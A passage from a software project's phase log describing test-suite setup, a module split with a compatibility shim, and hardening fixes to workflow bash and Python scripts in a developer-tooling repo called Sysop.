- **P1 missing invariants:** the spec described two new Sysop-original helpers (`_find_frontend_dir`, `_find_requirements_files`) with no test plan. Added § 3.47b step 7b covering security/correctness boundaries — ambiguous-match (raise, don't silently pick), symlinks without infinite recursion, malformed JSON, subprocess timeout, very large output (> 10 MB lint run), mode-filter routing.
- **P2 hand-wave:** "expect 5–10 tests to fail" with no names was unacceptable for an executable spec. Revised § 3.47c steps 14–16 to mandate a per-test classification log at `tests/PORT_LOG.md` before declaring done; added Step 0 pre-port baseline run in the gdp tree to disambiguate (a) script regression / (b) intentional divergence / (c) upstream gdp evolution Sysop has not absorbed.
- **P2 estimate optimism:** original 2-day estimate revised to 3–4 days on adversarial-finding evidence that the test surface is 70 functions, not the ~50 the first draft assumed.

Full sub-agent transcript verbatim in spec § 7; finding × resolution table in spec § 5.

**Why this is a new Sysop pattern.** Every prior phase shipped design + execution together (phase commit = the diff). Phase 47 separates them — the spec is committed today, execution waits on owner pickup. Two motivations: (1) the spec encodes the (a)/(b)/(c) decision rationale in a discoverable artifact so future absorptions facing the same trade have prior art to cite; (2) the adversarial-review-incorporated spec is itself the product of a measurable improvement loop (12 findings worth of correctness improvements happened to a piece of work that would otherwise have shipped as a small REVIEW_CHECKLIST entry). If Phase 47 executes cleanly off the spec, the spec-first pattern becomes a documented option for future phases ≥ 1-day in scope. If execution surfaces material gaps the spec didn't anticipate, that's signal to keep the bundled-design+execution shape for routine work.

**Things explicitly NOT in scope of the spec.** Tests for Sysop-original helpers (no gdp counterpart) — filed as § 3.47d follow-up. Bash script tests (gdp has `test_run_ratchet_lint.sh` for a script Sysop lacks) — § 3.47d follow-up. Splitting `run_checks_impl.py` into a package once it crosses 1000 lines post-port — Medium-priority follow-up. Integration tests that actually invoke `npx eslint` and `pip-audit` in CI — Low-priority follow-up with a promotion trigger. Ruff / mypy adoption in CI — out of scope until tests are stable. A runtime `requirements.txt` for Sysop — separate REVIEW_CHECKLIST entry filed during spec authoring.

**First downstream consumer.** None until execution lands. The spec affects no consumer behavior. BeanRider absorbs Phase 47 only after 47a + 47b ship (skill table edits + WORKFLOW.md updates flow through `sysop-update.sh`); the upstream-side `tests/` and CI never reach a consumer's repo (defensive: spec § 2 mandates `install.sh` has zero `tests/` references, verified during adversarial review).



## Phase 47a + 47b + 47c (executed 2026-05-27)

Phase 47 executed in one session against the adversarial-review-incorporated spec at [`PHASE_47_SPEC.md`](./PHASE_47_SPEC.md). All three sub-phases landed together: 47a (test infrastructure), 47b (gdp `2fdca506` ESLint + pip-audit ingest port), 47c (backfill of `test_next_task.py` + `test_validate_tasks.py`). **104 tests passing** end-to-end (3 smoke + 21 ported `test_run_checks.py` + 23 Sysop-original generalization tests + 41 ported `test_next_task.py` + 16 ported/original `test_validate_tasks.py`). Zero (a)-classified script regressions, zero (c)-classified deferrals against gdp absorptions — every gdp test in scope landed in Sysop on first port.

**Spec-first pattern outcome.** The adversarial-review-incorporated spec ran cleanly off the file with no material surprises mid-implementation. Two minor tweaks surfaced during execution and were absorbed inline: (1) gdp's `test_run_checks.py` is 414 lines, not the spec's 733 (the spec also recorded the post-`2fdca506` function count of 21, which was correct — the line count assumption diverged from reality); (2) the spec's "schema_version=2 + valid blast_radius" Sysop-original test used `small` as the value, but Sysop's enum is `{single-file, single-module, cross-module, architectural}` — corrected to `single-module` during run. Neither tweak required a spec revision because both were factual reconciliations against the live gdp / Sysop source, not design decisions. **The spec-first pattern is now confirmed as a viable option for future phases ≥ 1 day in scope** — design errors caught by adversarial review BEFORE execution paid back; line-count drift in a four-page spec cost ~5 minutes of execution-time reconciliation.

**47a — test infrastructure.** `pyproject.toml` at repo root (pytest-only, no `[project]` table since Sysop is a meta-repo, not an installable package). `tests/` directory with `__init__.py`, `conftest.py` (env-pop neuter for SLACK/PAGERDUTY/OPENAI/ANTHROPIC + `requires_node` / `requires_pip_audit` collection-modifier markers), and `tests/README.md` (declares "not installed into consumer repos" + documents branch-protection clickpath). `requirements-dev.txt` with exact pins (`pytest==9.0.3` matching gdp parity, `pyyaml==6.0.2`) plus a comment block explaining Sysop ships no runtime requirements by design. `.github/workflows/tests.yml` mirrors gdp's `backend-test.yml` shape verbatim (SHA-pinned actions per Phase 46 sibling-parity discipline, `concurrency:` group, `permissions: contents: read`, scoped `pull_request.types`, Python 3.13). `.gitignore` extended with `.pytest_cache/`. Smoke test (`test_smoke.py`) imports the three load-bearing scripts (`next_task`, `validate_tasks`, `run_checks_impl`) to guard against import-time regressions before wiring behaviour tests.

**47b — gdp `2fdca506` port.** Sysop's `run_checks_impl.py` grew from 852 → 1073 lines absorbing `_run_eslint()` + `_run_pip_audit()` plus two new generalization helpers (`_find_frontend_dir`, `_find_requirements_files` — Sysop-original because gdp hardcodes `frontend/` and `requirements.txt:1`). `_find_frontend_dir` raises `FrontendDirAmbiguous` on >1 match (decided during spec authoring per adversarial finding #8: silent picking masks consumer misconfiguration; raise so the caller resolves explicitly). `_find_requirements_files` returns `sorted(glob.glob("requirements*.txt"))`, restricted to files (not directories) and refusing extension-suffixed forms like `requirements.txt.bak`. The main() dispatcher gained `lint-*` and `pip-audit-*` mode-filter branches matching gdp's verbatim shape; the `--update-baseline` path was extended in parallel. `checks.yml.fragment` gained `lint-error` (`used_by: [codebase-review, security-audit]` because `jsx-a11y/*` rules map to OWASP A07/A05) and `pip-audit-vuln` (`used_by: [security-audit]`, A06). Both `notes:` annotated, both `blocking: false`. Skill files for `/codebase-review` (Step 2b-2 → "LSP / Typechecker / Lint", lint-error added to Step 3c skip-amplification list) and `/security-audit` (Step 2b → "Grep + Tool", Agent 6 rewritten to consume Step 2b's `[pip-audit]` findings rather than re-running) edited byte-for-byte parallel where the gdp prose was identical. `WORKFLOW.md` §2.5 step-4 enumeration grew from (a)/(b)/(c) to (a)–(e); §6.5 documents `_run_eslint` / `_run_pip_audit` and the generalization helpers.

**47c — test backfill.** `tests/test_run_checks.py` (21 functions, ported as a single unit per spec § 3 step 11 since `2fdca506` is a 5 → 21 rewrite, not a separable 5+16 delta). `tests/test_next_task.py` (41 functions ported; 39 port-clean, 2 marked `(b)` — `firebase` keyword reference replaced with `dashboard` because Phase 45a stripped gdp-specific keywords from `_USER_ACTION_KEYWORDS`; review-batch fixture rebased on placeholder vocabulary). `tests/test_validate_tasks.py` (8 gdp tests ported all marked `(b)` for the helper rename `_locks_dir` → `_resolve_canonical_locks_dir`; one had a real behavioral divergence on the OSError fallback — Sysop catches `subprocess.SubprocessError` not bare `OSError`, so a `PermissionError` propagates; test was rewritten to assert that invariant). Eight Sysop-original tests appended in the same file covering `blast_radius` (Phase 19), `in_progress`-requires-lock (Phase 32 / BeanRider ISSUE-0032), and status-vs-directory drift (Phase 18 / BeanRider ISSUE-0009). `tests/test_run_checks_generalizations.py` (23 Sysop-original tests — never had a gdp counterpart) covers the new generalization helpers plus invariant boundaries gdp's mock-only suite doesn't exercise (malformed JSON, truncated JSON, > 1 MB output without OOM, subprocess timeout enforcement, mode-filter routing, anchor selection for pip-audit). `tests/PORT_LOG.md` records the per-test classification ledger (53 port-clean, 17 `(b)` intentional divergence, 0 `(a)`/0 `(c)`) mandated by adversarial finding #8.

**Things explicitly NOT done.** Branch protection on `main` requiring the `pytest` check (spec § 3 step 5b) is a manual GitHub UI configuration that requires repo-admin access; it is documented in `tests/README.md` for the human to apply post-merge. Tests for the other seven Sysop-original helpers with no gdp counterpart (`sitrep_survey.py`, `archive_review_tasks.py`, `review_index.py`, `parse_subagent_envelope.py`, `permission_denied_hook.py`, `backfill_completed_dates.py`, `auto_claim_miner.py` + `_v2.py`) — filed as Phase 47d follow-up. Bash script tests (`claim_task.sh`, `close_batch.sh`, etc.) — Phase 47d follow-up. Splitting `run_checks_impl.py` into a package post-port (now 1073 lines, past the 1000-line guideline) — Medium-priority REVIEW_CHECKLIST entry. Integration tests that actually invoke `npx eslint` and `pip-audit` in CI — Low-priority with promotion trigger (a parser regression slipping through the mocked suite). A runtime `requirements.txt` for Sysop — separate REVIEW_CHECKLIST entry (the dev-only pin is correct per spec § 2 design; opening that question independently keeps the runtime-vs-dev split visible).

**First downstream consumer.** None at landing time — the consumer-facing changes (skill table edits, `WORKFLOW.md` §2.5/§6.5 prose, `checks.yml.fragment` registry entries) flow into BeanRider via the next `sysop-update.sh` run. The `tests/`, `pyproject.toml`, `requirements-dev.txt`, and `.github/workflows/tests.yml` are upstream-only by design — `install.sh` was verified during adversarial review to have zero `tests/` references; no consumer ever sees Sysop's own test suite.

## Phase 48 (executed 2026-05-27)

Phase 48 closes the medium-priority follow-up filed by Phase 47 § 3.47d: backfill tests for the seven Sysop-original Python helpers that have no gdp test counterpart. **170 new tests across 7 new files; full suite 274 passing in 0.62s** (was 104 — +163% growth). Zero behaviour changes — pure test additions.

**Why this followed Phase 47 immediately rather than waiting.** The test infrastructure (pytest config, `requires_node` / `requires_pip_audit` markers, conftest env-pop neuter, `tests/` layout, `PORT_LOG.md` ledger convention) was hot in this session's working memory. Authoring the seven new test files reused the patterns Phase 47 just established (`tmp_path` fixtures, `monkeypatch` for `sys.stdin`, `mock.patch.object` at the subprocess boundary), so the per-helper authoring cost stayed low. Deferring would have re-paid the ramp-up cost on the next session. The seven helpers also include two recent additions (`parse_subagent_envelope.py` — Phase 37; `permission_denied_hook.py` — Phase 36) that are higher-stakes to leave uncovered because their entry points are harness-driven (SubagentStop / PermissionDenied hooks fire on every applicable event, not just human-driven invocations).

**Per-helper breakdown.**

| Helper | Lines | Tests | Surface |
|---|---|---|---|
| `parse_subagent_envelope.py` | 274 | 23 | Phase 37 SubagentStop hook — envelope fence parser, last-wins rule, JSON-write boundary, `_unparseable_*.json` diagnostics. |
| `permission_denied_hook.py` | 206 | 28 | Phase 36 PermissionDenied hook — three matchers (protected_push / destructive_push / protected_commit), venv-hint conditional, silent-passthrough contract. |
| `backfill_completed_dates.py` | 221 | 14 | One-time migration helper — mocked `git log -S` (bold-form + backtick fallback), `--dry-run`, `--id-pattern`, error paths. |
| `review_index.py` | 504 | 24 | `review_tasks.md` → JSON-index parser — round/batch/metadata regex coverage, staleness lifecycle, query helpers. |
| `archive_review_tasks.py` | 555 | 22 | Manual archival — `parse_archivable_batches` (mixed-status / `---` / `all_merged`), `build_archive_block`, `update_review_tasks` (full-round + partial-round removal). |
| `sitrep_survey.py` | 1278 | 38 | Phase 40 lifecycle classifier — low-level helpers (`_parse_lock_file`, `_extract_doc_work_trailers`, `_is_task_shaped_branch`, `_derive_task_id_from_branch`, `_phase40_fallback`) + the seven `_classify_task` lifecycle states. |
| `auto_claim_miner.py` + `_v2.py` | 641 | 21 | v1+v2 retrospective miners — `parse_close` / `parse_iso` / regex contracts / v1↔v2 parity / v2's three-way `classify` routing. |

**Intentional deferrals (documented in `tests/PORT_LOG.md` as Phase 48 follow-ups).** Two `sitrep_survey.py` functions stay uncovered in this phase: `_find_discrepancies` (multi-source cross-check across locks × worktrees × index × branch list with five distinct discrepancy kinds plus a branch-list `_git` shell-out) and `_classify_review_batches` (parallel cross-check shape with flag-truncation rendering). Both are testable in isolation, but the fixture stack to mock the five subprocess and three filesystem boundaries cleanly would be more elaborate than the tests themselves. The thirty-something OTHER helpers in `sitrep_survey.py` that share these inputs are tested in isolation, so the gap is on integration-shape paths, not unit logic. A future phase can absorb them when either becomes a regression risk; tracked as a new medium-priority REVIEW_CHECKLIST entry.

**Two fixture corrections caught during authoring (not script bugs).**

1. `test_review_index.py` — the initial deferred-task fixture put the em-dash trailer BEFORE the emoji (`desc — reason 🟡`). The `_DEFERRED_TASK_RE` matches that as a single em-dash-trailer match with `severity=None`. Documented schema is emoji-first (`desc 🟡 — reason`); fixture updated to match.
2. `test_sitrep_survey.py` — the initial multi-trailer fixture used `FEAT-1` / `TECH-2`, both of which fail `TASK_ID_RE` (`[A-Z0-9][A-Z0-9-]+` needs ≥2 chars after the dash). Fixture corrected to `FEAT-01` / `TECH-02`.

Both are documented in `tests/PORT_LOG.md` for traceability. Neither indicates an actual script defect — Phase 48's test surface is now reading the same schema the production code enforces.

**Classification scheme divergence from Phase 47.** Phase 47 used `(P)` / `(a)` / `(b)` / `(c)` because every test had a gdp counterpart for comparison. Phase 48 has no gdp counterpart for any of the seven files, so the only relevant classifications are *original* (every test) and *deferred* (`_find_discrepancies` + `_classify_review_batches`). `PORT_LOG.md` notes this distinction inline rather than carrying empty `(a)`/`(c)` columns.

**Two helpers, one test file.** `tests/test_auto_claim_miner.py` covers both `auto_claim_miner.py` and `auto_claim_miner_v2.py` because v2 reuses v1's `parse_close` / `parse_iso` / regex constants verbatim — the parity tests catch drift between the two if either is edited without the other. v2's unique surface (`classify` workflow-incidental routing) gets its own test block. Both miners live at top-level `scripts/`, not `core/companion/scripts/`, because they're authoring-side retrospective tools, not workflow runtime; the test file uses a `sys.path.insert` at the top to surface that directory for import without polluting `pyproject.toml`'s pythonpath.

**Permission-prompt sidestep.** Sysop's `.claude/settings.local.json` carries `Bash(git *)` (broad glob) but not the explicit `Bash(python3 -:*)` rule the `/document-work` skill requires for Step 3b's heredoc. The Permission Guard noted this asymmetry; Phase 48 proceeded because the skill's other steps either no-op for Sysop (Step 3b skips when `tasks/index.yml` is absent) or were satisfied by the broader git glob. A future cleanup phase could either add the explicit `python3 -:*` rule for symmetry with the skill's documented prereqs, or update the skill prose to recognize `Bash(git *)` as sufficient when no `tasks/` system is present.

**Skills audit surfaced during close-out.** The user noted that `/document-work` did most of its lifting as no-ops here (no `tasks/index.yml` → Step 3b skipped; no convention map sections matching `tests/` → Step 1b no-op; on `main` → Step 5 push skipped; the only unique output was an orphan `.pending-docs/main.md` that Sysop has no `/review-close` consolidation step to consume). Phase 47's commit history (`9e42b4a` → `9020e57` → `19b392c`) showed the actual pattern: direct commits on `main` + follow-up docs commits, not the pending-docs → `/review-close` consolidation flow. Phase 48 followed the inline pattern after the initial `/document-work` invocation: pending-docs file deleted, CLAUDE.md / PHASE_LOG.md / REVIEW_CHECKLIST.md updated directly. The lesson lands as durable session feedback (see CLAUDE.md memory): for Sysop's meta-repo shape, `/document-work` is high-friction-low-value compared to the inline pattern; future phases should default to direct commits.

**Things explicitly NOT in scope.** Coverage of the two deferred `sitrep_survey` functions (`_find_discrepancies`, `_classify_review_batches`) — filed as a new medium-priority REVIEW_CHECKLIST entry. Bash script test coverage — already a Phase 47 follow-up. Splitting `run_checks_impl.py` post-1000-line — already a Phase 47 follow-up. Coverage of `install.sh`, `WORKFLOW.md`, or any non-Python helper — bash testing is a separate Phase 47 follow-up; markdown content is correctness-by-review, not test surface.

**First downstream consumer.** None — Phase 48's entire footprint is `tests/` (upstream-only, never installed) plus three doc updates (CLAUDE.md, PHASE_LOG.md, REVIEW_CHECKLIST.md). Zero impact on `install.sh`, zero impact on `sysop-update.sh`, zero impact on any consumer's `.claude/` or `scripts/` tree.


## Phase 49 (executed 2026-05-27)

Phase 49 closes the Phase-47-filed Medium-priority follow-up: split `core/companion/scripts/run_checks_impl.py` (1113 lines) into a `core/companion/scripts/run_checks/` package. Pure structural change — zero behaviour modifications, full 274-test suite green before and after. The pre-scan pipeline's stages — registry parsing, grep dispatch, LSP (pyright + tsc), ESLint, pip-audit, semgrep, baseline I/O — were already separable in the source file (cleanly delineated by `# ──` header comments since Phase 2H); the split lifts each into its own module under a common package namespace.

**Final layout.** Ten files in `run_checks/`: `__init__.py` (package docstring), `__main__.py` (so `python -m run_checks` works as an alternate entrypoint), `cli.py` (263 lines — `main()` + the four-stage filter+dispatch loop; got the `git mv` from the old monolith so `git log --follow` recovers the full pre-split history), `config.py` (115 lines — `_SKIP_DIRS`, `parse_checks_yml`, `_validate_check`, `filter_checks`), `grep.py` (250 lines — `run_grep`, `run_check`, position-check internals, `_iter_check_files`), `lsp.py` (156 lines — pyright + tsc + the tsc-continuation parser), `lint.py` (140 lines — `_run_eslint` + `_find_frontend_dir` + `FrontendDirAmbiguous`; the discovery helper lives with its only caller), `pip_audit.py` (93 lines — `_run_pip_audit` + `_find_requirements_files`; same lives-with-caller pattern), `semgrep.py` (81 lines — `_run_semgrep`), `baseline.py` (50 lines — `load_baseline`, `finding_key`, `write_baseline`). Largest module is `cli.py` at 263 lines; smallest material module is `baseline.py` at 50; the original file's 1113 lines now distribute across modules that each have ample room before bumping any size guideline.

**Backwards-compat shim.** `core/companion/scripts/run_checks_impl.py` survives as a 64-line shim that re-exports every public and underscore-prefixed symbol from the package, preserves `import subprocess` (so the test suite's ~30 `patch("run_checks_impl.subprocess.run")` calls still resolve — and because Python's `subprocess` is a singleton module, those patches apply globally to every submodule's calls), and re-exports `main()` so `run_checks.sh`'s direct invocation (`python "${SCRIPT_DIR}/run_checks_impl.py"`) needs no wrapper change. The shim approach was chosen over the test-rewrite alternative (~30 patch-string updates across `test_run_checks.py` + `test_run_checks_generalizations.py`) because the test-rewrite carries a real silent-failure risk: a `patch("run_checks.lint.subprocess.run")` typo would still pass the test (mocks that don't apply silently still pass the test body), whereas the shim's singleton-subprocess insight is harness-verified end-to-end every test run.

**Install pathway fix.** The split surfaced a latent bug in `install.sh::install_companion_scripts()`: its file-copy loop used `[[ -f "$f" ]] || continue` to skip directories, which had been correct prior to Phase 49 (the only subdirectories under `core/companion/scripts/` were `__pycache__/` from local pytest runs, which absolutely should not be installed). After Phase 49's split introduced `run_checks/` as a legitimate sub-package, the loop would have silently skipped the entire package — consumers (BeanRider) running `bash scripts/sysop-update.sh` would have ended up with the shim alone, a broken `from run_checks.cli import main`, and a hard ImportError on the next `run_checks.sh` invocation. The fix: extend the loop with an `elif [[ -d "$f" ]]` branch that mirrors one level deep, with an explicit `__pycache__` skip to preserve the original directory-skip property. Verified end-to-end on a scratch repo: `bash install.sh /tmp/wadeflow-phase49-install2 --packs python --no-arm-hooks --yes` lands `scripts/run_checks/` with all 10 files; lock file's `managed_paths` lists each package file (so `--update` tracks them correctly); `bash scripts/run_checks.sh --mode quality` runs end-to-end against a stub `.claude/checks.yml` and produces the expected finding line. No `.pyc` leakage into the consumer tree, no `__pycache__` in `managed_paths`.

**`_phase_24b_in_scope()` deliberately not extended.** Phase 24b's preservation system protects consumer-modified `scripts/<file>` and `scripts/hooks/<file>` paths from `--update` overwrite (consumers can hand-edit and the next absorption keeps their version). The new `scripts/run_checks/*.py` files are explicitly NOT added to that scope — for an in-tree Python package, the right default is upstream-overwrites-consumer (skill prose, semgrep rules, and workflow docs already follow this property per the Phase 24b scope-filter rationale). A consumer who hand-edits `scripts/run_checks/lsp.py` is silently forking their pre-scan logic; that's a anti-pattern Sysop shouldn't make ergonomic. If a real need surfaces (e.g., a consumer wants to inject a project-specific tool stage), the right shape is a pack-level extension or a Sysop upstream phase, not a hand-edit-and-preserve workflow.

**Verification all green.** Baseline `274 passed in 0.62s` (pre-split, Phase 48's figure). Post-split: `274 passed in 0.76s` (no test changes, no regressions). End-to-end smoke tests on `/tmp/wadeflow-phase49-smoke` (raw shim entrypoint), `/tmp/wadeflow-phase49-install2` (post-install consumer invocation via `scripts/run_checks.sh`), and `python -m run_checks --repo-root <stub>` (the new canonical `__main__.py` entrypoint) all produce identical findings. The slight test-time bump (0.62s → 0.76s) is the shim's module-import overhead — eight `from run_checks.X import (...)` statements vs. the prior single-file load; not consequential for the test surface.

**Out of scope (intentionally).** Reusing the package shape for any other large companion script. `archive_review_tasks.py` (555L) and `sitrep_survey.py` (1278L — also past the guideline) are the next candidates if growth pressure surfaces, but Phase 49 deliberately scopes to just `run_checks_impl.py` per the filed entry — the other two are not yet at "next 200+ line feature pushes them over" pressure, and the package-shape pattern is now demonstrated and reusable when they get there. Renaming the shim file. The natural name post-split is `run_checks.py` (matching the package), but the shim path is load-bearing for `run_checks.sh`'s invocation; renaming would force a wrapper edit + a consumer-side managed-path rename + a lock-file path migration (Phase 7+). The shim's 64-line cost is much lower than that breakage budget; revisit if a future phase has other reasons to touch the wrapper.

**First downstream consumer.** BeanRider, on its next `bash scripts/sysop-update.sh` cycle. Absorption is mechanical: the existing `scripts/run_checks_impl.py` gets overwritten with the new 64-line shim (managed path, no preserve trigger), a fresh `scripts/run_checks/` directory appears with all 10 files (new managed paths, recorded in the post-update lock), and `bash scripts/run_checks.sh` continues to work without any consumer-side intervention. No pre-absorption commits required; no `*.project.<ext>` file to author; no convention to migrate. The divergence-detection block (Phase 8) and post-overwrite delta summary (Phase 24b) will both correctly identify `scripts/run_checks_impl.py` as a heavy-deletion overwrite (1113 lines → 64 lines), which is signal-correct — the file genuinely became a shim.

## Phase 50 (executed 2026-05-27)

Phase 50 backports BeanRider-side hardening on `close_batch.sh` and `claim_task.sh` (the convention promotion runs inverse-direction here — BR's running copies are better than upstream and Phase 24b would have silently lost them on any future `--accept-upstream`), and bundles a one-line `Grand Total` grep fix from ISSUE-0044 that the BR diff didn't already carry. Resolves BeanRider ISSUE-0040 + ISSUE-0044 in a single ship. No test changes; full 274-test suite green before and after.

**`close_batch.sh` — atomic-rewrite refactor (ISSUE-0040 item 1).** The five separate `sed -i` mutations (header status, two checkbox patterns, two statistics-table cell patterns) now collapse into one multi-`-e` `sed` invocation that writes to `${TASKS_FILE}.tmp`, then `mv` into place; matching `trap 'rm -f "$TMP_FILE"' EXIT` guards leftover detritus on abort. CLAUDE.md § Data integrity calls for exactly this shape — a mid-flow interrupt under the old per-`sed -i` pattern could leave `review_tasks.md` half-edited (one mutation landed, four pending), and downstream readers — `review_index.py`, `/next-task`, every skill that scans the file — treat the on-disk state as canonical. Same atomic-rewrite shape applied to the `Grand Total` count mutation block (under the existing `if [[ -n "$CURRENT_DONE" && -n "$CURRENT_OPEN" ]]` short-circuit). The portable-sed shim (`SED_INPLACE=(-i)` for GNU vs. `(-i '')` for BSD) is now unused — removed in the same diff since the atomic-rewrite path writes to stdout and `mv`s, neither of which needs in-place flags.

**`close_batch.sh` — end-anchored status regex (ISSUE-0040 item 2).** `BATCH_STATUS=$(grep -oE '\`[A-Za-z ]+\`' | tr -d '\`')` greedily captured the *first* backtick block on the header line, so a title containing an embedded backtick token (e.g. `` ### Batch 12 — fix `foo` regression `In Progress` ``) yielded `foo` as the status, mismatched the actual `In Progress` token in the downstream `sed s#...#...#` substitutions, and left the header in `Pending`/`In Progress` while the task checkboxes still flipped to `[x]` — silent half-migration. Fix: anchor on `[[:space:]]*$` so the regex only matches the trailing backtick block, with a `sed 's/[[:space:]]*$//'` tidy-up for whitespace. Smoke-tested on `/tmp/wf-phase50-tickyfoo` with a deliberate `` `foo` `` token mid-title; pre-fix the script would have produced the half-migration; post-fix it correctly identifies `In Progress` and lands the merged header.

**`close_batch.sh` — `Grand Total` grep `|| true` guard (ISSUE-0044).** Lines 219–220 grep for `Grand Total` in a command substitution; consumers (BR included) that don't author a `## Statistics` block produce no match, and `set -o pipefail + set -e` causes the failing pipe inside `$(...)` to abort the script before the Phase 33 commit-failure handler fires and before the Phase 43a terminal completion banner prints. Symptom shape mirrors ISSUE-0039 (script exits 0 after `✅ Marked as Merged`, no commit, `review_tasks.md` modified-but-unstaged) but lands one path further upstream than either Phase 33 or Phase 43a's three-hypothesis diagnosis. Fix: append `2>/dev/null` + `|| true` to each grep — the existing inner `if [[ -n "$CURRENT_DONE" && -n "$CURRENT_OPEN" ]]` already short-circuits cleanly on empty captures, so no further logic changes were needed. Smoke-tested on `/tmp/wf-phase50-issue44` with a minimal `review_tasks.md` containing one Batch + one task + NO `## Statistics` block; pre-fix the script bailed before the Summary line; post-fix the commit lands and the Phase 43a terminal banner reads `close-batch commit present: 1`. Treat `## Statistics` / `Grand Total` as optional going forward — some consumers won't author them.

**`claim_task.sh` — awk-based pipefail-safe lock parsing (ISSUE-0040 item 1, claim half).** `LOCK_STATUS=$(grep '^status:' "$f" | sed 's/status: *//' || echo "unknown")` fails as a unit under `set -euo pipefail` when grep matches nothing — pipefail + empty grep = command failure, trapped by `set -e` before the `|| echo "unknown"` fallback can run. Replaced with `awk '/^status:/{sub(/^status: */, ""); print; exit}'` + `LOCK_STATUS="${LOCK_STATUS:-unknown}"`: single-process, exits on first match (so a malformed lock with a later `# status: ...` comment or `notes: status: foo` line doesn't bleed into the displayed status), doesn't trip pipefail. Same shape applied to the branch-line read (which had the same `grep '^branch:' | sed` antipattern inline in the `echo` interpolation). The branch read is now a separate `LOCK_BRANCH=` capture before the echo, matching the status read for symmetry.

**`claim_task.sh` — POSIX shell-arithmetic date fallback (ISSUE-0040 item 2, claim half).** Adds a third fallback after BSD `date -v+4H` and GNU `date -d "+4 hours"`: `EXPIRY_EPOCH=$(( $(date +%s) + 14400 ))` then attempts `date -u -r "$EXPIRY_EPOCH"` (BSD again, different flag), then `date -u "+%Y-%m-%dT%H:%M:%SZ" -d "@$EXPIRY_EPOCH"` (GNU, epoch syntax), with a clear error if all three paths fail. Closes the latent gap where neither BSD nor GNU `date` is present (Alpine/busybox minimal distros) and the old code would emit `expires: ` with an empty value, which downstream lock-validator tooling treats as malformed. Not yet observed on any real consumer; defensive against future minimal-image use.

**Order of bundle.** BR's diff carried items 1+2 on close_batch.sh and items 1+2 on claim_task.sh as one absorption move; Sysop had only the ISSUE-0044 grep fix outstanding from a different filing path. Bundled in one phase to avoid two ships of `close_batch.sh` in the same week — the atomic-rewrite refactor and the `|| true` guard land on adjacent lines and a split would have made the diff harder to read. The BR-side improvements were originally authored to fix problems BR's task-shape distribution surfaces; absorbing them upstream eliminates the per-update delta detection (Phase 8) that would have flagged BR's `close_batch.sh` and `claim_task.sh` as ⚠'d managed paths on every future cycle.

**Verification all green.** `bash -n` syntax check on both scripts. Three smoke-test scenarios on three scratch repos (`/tmp/wf-phase50-issue44` for the no-Grand-Total path, `/tmp/wf-phase50-happy` for the full statistics+grand-total path, `/tmp/wf-phase50-tickyfoo` for the embedded-backtick title path) — all three land the close-batch commit and the Phase 43a terminal banner prints `close-batch commit present: 1`. No `.tmp` detritus left behind in any scenario (atomic-rewrite trap cleanup verified). Full 274-test pytest suite passes in 0.73s (no test changes, the suite covers Python helpers; the bash scripts have no test coverage today — see the existing low-priority Phase 47 followup for the future `bats`/`shellcheck` harness).

**Out of scope (intentionally).** The eleven other Phase-24b-preserved BR-side scripts named in ISSUE-0040 (`archive_review_tasks.py`, `backfill_completed_dates.py`, `batch_work.sh`, `cleanup_worktrees.sh`, `parse_subagent_envelope.py`, `permission_denied_hook.py`, `review_index.py`, `run_checks_impl.py`, `validate_tasks.py`, `scripts/hooks/pre-commit`, `scripts/hooks/pre-merge-commit`) — audit them in a follow-up after BR's next absorption cycle exercises them; some are likely path-tweak-only divergences that `--accept-upstream` losslessly. The Phase 24b scope itself is not extended (the new `scripts/run_checks/*.py` files from Phase 49 stay out of preservation as a deliberate choice — see Phase 49's prose).

**First downstream consumer.** BeanRider, on its next `bash scripts/sysop-update.sh` cycle. Absorption is mechanical and signal-correct: the Phase 24b safety net currently has BR's diverged versions of `close_batch.sh` and `claim_task.sh` flagged as preserved; after Phase 50 lands the upstream copies match BR byte-for-byte, so a `--accept-upstream scripts/close_batch.sh --accept-upstream scripts/claim_task.sh` cycle should produce a clean trailing-newline-only diff. Independent verification: a real `/review-close` that closes 2+ batches must complete cleanly with no mid-edit tempfile detritus, no IFS-related abort, and the terminal banner reading `close-batch commit present: <N>`.

## Phase 51 (executed 2026-05-27)

Phase 51 closes out the Phase 50 follow-up audit of the 11 Phase-24b-preserved BR-side scripts that Phase 50 named but did not touch. The audit ran `diff core/companion/scripts/<file> ~/Projects/BeanRider/scripts/<file>` for each, classified into three buckets per the filed shape (path-tweak-only / demonstrably-better / real-fork), and shipped the bucket-2 wins. Net result: five scripts cp'd verbatim from BR, one script partial-ported, three deferred or skipped for documented reasons, and two real-fork findings filed as separate REVIEW_CHECKLIST entries (one HIGH-priority security finding). No test changes; full 274-test suite green before and after.

**Verbatim cp's (Bucket 2 — clean wins).** `batch_work.sh`, `cleanup_worktrees.sh`, `permission_denied_hook.py`, `review_index.py`, `validate_tasks.py` all became byte-identical with their BR counterparts. The substantive improvements absorbed: `batch_work.sh` — atomic-rewrite of three sed mutations into one tempfile + `mv` (same pattern Phase 50 applied to `close_batch.sh`); switched off `sed -i` portability detection by using shell-redirect form (works on both BSD and GNU without the shim); surfaces `install_hooks.sh` stderr so a real install failure isn't muted. `cleanup_worktrees.sh` — drops `2>/dev/null` muting on `git worktree prune` + `git worktree remove`; removes the auto-`--force` fallback (preserves Phase 31's never-destroy-user-work invariant — explicit `--force` flag still works, but the silent fallback is gone); renames `local_*` vars to `wt_*` (`local` is a bash builtin and reading nested `local` inside loops led to subtle bugs). `permission_denied_hook.py` — narrows `except Exception` to `(subprocess.SubprocessError, OSError)` at two sites; adds a forward-looking docstring caveat about the `cd <path> && ` regex's whitespace-in-path edge case. `review_index.py` — real bug fix: `os.path.isdir(.git)` walks past a worktree root because worktree `.git` is a *file* (`gitdir: <path>`) not a directory; switching to `os.path.exists` fixes `TASKS_FILE` resolution inside a worktree. Plus `errors="replace"` on read for corruption resilience, caller-contract docstring on `_sha256_file`, severity-emoji escape comments for grep-discoverability. `validate_tasks.py` — drops unused `import logging` + `logger = logging.getLogger(__name__)` declaration (trivial cleanup BR did during a previous absorption).

**Partial port (Bucket 2 — entangled).** `parse_subagent_envelope.py` carried two BR-specific additions (`_DIGIT_RUN_RE` 4+-digit redaction for ledger PII, plus a `_sanitize_message_excerpt` helper that imports `_sanitize_log` from a sibling `_log.py` BR ships) tangled with one generic improvement (narrows `except Exception` to `(subprocess.SubprocessError, OSError)` at the one site that wraps a `subprocess.run` call). Took the generic improvement only — the PII redaction is BR-domain-specific (sub-agent messages discuss ledger payees, amounts, account numbers); upstream Sysop has no equivalent privacy surface to protect. Same `_log.py` entanglement that defers scripts 1+2 (see Deferred below) — the partial port intentionally skips the parts of BR's diff that touch `_log` imports.

